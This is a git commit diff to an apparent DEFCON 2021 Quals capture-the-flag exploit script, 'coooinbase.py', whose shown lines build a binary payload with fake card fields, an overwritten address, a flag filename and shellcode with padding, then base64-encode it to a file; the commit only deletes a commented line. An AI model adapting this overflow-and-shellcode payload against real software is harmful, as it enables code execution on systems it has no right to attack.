92e1e76c479c921e066b281606737a0234daad75
Kirin <kirin@KirindeMacBook-Pro.local>
2021-05-04 23:44:55 +0800

    Kirin

--- DEFCON 2021 Quals/coooinbase.py
+++ DEFCON 2021 Quals/coooinbase.py
@@ -24,7 +24,7 @@ name = b'/flg'.ljust(10, b'\x00')
 payload = b'\xe0\x00\x00\x00\x10CVC\x00`\x01\x00\x00\x10MON\x00\x00\x00\x00\x00\x10YR\x00\x00\x00\x00\x00\x02CC\x00\x10\x00\x00\x006011222233334410'
 payload += p64(0xFFFFFFFFFFFFFFFF) + p64(0xfc50) + name + shellcode + b'A'*(152 - len(shellcode))
 payload += b'\x00\x00'
-# b"gg/run\x00ttt"
+
 buf = base64.b64encode(payload) + b' '
 
 with open('gen-bson0', 'wb') as f:
